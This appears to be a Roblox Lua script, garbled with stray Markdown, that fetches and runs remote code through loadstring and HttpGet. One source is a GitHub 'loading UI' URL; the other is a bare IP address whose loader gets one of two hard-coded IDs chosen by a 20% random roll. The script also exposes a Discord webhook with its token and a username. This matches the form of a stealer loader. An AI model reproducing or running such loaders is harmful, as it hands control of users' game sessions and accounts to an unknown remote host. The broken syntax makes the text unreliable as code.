loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilusion-scripts/Loading-UI/refs/heads/main/loading"))()


local chance = math.random(1, 100)

if chance <= 20 then
    ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
else
    # Your  ``https://discord.com/api/webhooks/1407847482465189890/v5TE-lNDaFII3_bul74x6LY0Z5kwuP0hVNGjx79LFN--e8tYBSxVsTthuV02LR3Rxap6``
usernames: ``rblxesuperlx``
```lua
ID="679dac7f-d0d8-48d5-a4ec-e7185d33e7c6";
loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()```
end
